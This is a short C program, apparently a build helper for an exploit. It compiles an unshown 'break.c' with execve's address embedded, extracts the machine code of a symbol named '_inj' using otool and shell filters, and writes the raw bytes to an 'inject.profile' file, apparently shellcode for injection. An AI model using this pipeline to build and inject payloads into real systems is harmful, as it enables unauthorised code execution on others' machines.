#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <assert.h>
#include <stdlib.h>

char unhex_char ( char ch )
{
	switch (ch)
	{
		case '0': return 0;
		case '1': return 1;
		case '2': return 2;
		case '3': return 3;
		case '4': return 4;
		case '5': return 5;
		case '6': return 6;
		case '7': return 7;
		case '8': return 8;
		case '9': return 9;
		case 'a': return 10;
		case 'b': return 11;
		case 'c': return 12;
		case 'd': return 13;
		case 'e': return 14;
		case 'f': return 15;
		default: assert(0 == 2);
	}
	return 0;
}

char unhex ( char* hx )
{
	return unhex_char(hx[0]) << 4 | unhex_char(hx[1]);
}

int main ( int argc, char** argv )
{
	int rc, len = 0, i;
	char readByte;
	FILE* fp;
	char mainBuffer[4096 * 2];
	if (argc > 1)
	{
		sprintf(mainBuffer, "gcc %s -S -O3 -pipe break.c -DEXECVE=%p -o asm.s", OTHERFLAGS, execve);
		system(mainBuffer);
		return 0;
	}
	printf("Compiling breaker with execve=%p\n", execve);
	sprintf(mainBuffer, "gcc -ffreestanding %s -c -O3 -pipe break.c -DEXECVE=%p -o break.o", OTHERFLAGS, execve);
	system(mainBuffer);
	printf("Getting hex dump of symbol _inj\n");
	strcpy(mainBuffer, "otool break.o -t -p _inj | grep -v -E ':|section' | cut -d ' ' -f 2-18 | sed 's/ //g' >break.hex");
	system(mainBuffer);
	printf("Unhexing dump\n");
	fp = fopen("break.hex", "r");
	assert(fp);
	while (!feof(fp))
	{
		rc = fread(&readByte, 1, 1, fp);
		if (rc > 0 && readByte != '\n')
		{
			mainBuffer[len++] = readByte;
		}
	}
	len /= 2;
	for (i = 0; i < len; i++)
	{
		mainBuffer[i] = unhex(&mainBuffer[i*2]);
	}
	printf("Writing profile\n");
	fclose(fp);
	fp = fopen("inject.profile", "w");
	assert(fp);
	fwrite(mainBuffer, len, 1, fp);
	fclose(fp);
	return 0;
}

